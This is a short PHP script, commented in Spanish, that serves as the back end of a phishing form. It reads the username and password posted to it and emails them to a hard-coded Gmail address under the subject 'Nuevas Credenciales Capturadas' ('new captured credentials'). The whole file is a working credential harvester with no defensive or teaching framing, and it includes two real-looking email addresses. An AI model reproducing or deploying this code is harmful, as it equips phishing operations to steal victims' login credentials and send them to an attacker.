<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['username'];
    $pass = $_POST['password'];

    $to = "esquicr@gmail.com";  // Reemplaza con tu dirección de correo
    $subject = "Nuevas Credenciales Capturadas";
    $message = "Usuario: " . $user . "\nContraseña: " . $pass;
    $headers = "mhermoso890@gmail.com";  // Reemplaza con una dirección de correo válida

    if (mail($to, $subject, $message, $headers)) {
        echo "Datos enviados correctamente.";
    } else {
        echo "Error al enviar los datos.";
    }
} else {
    echo "Método no permitido.";
}
?>
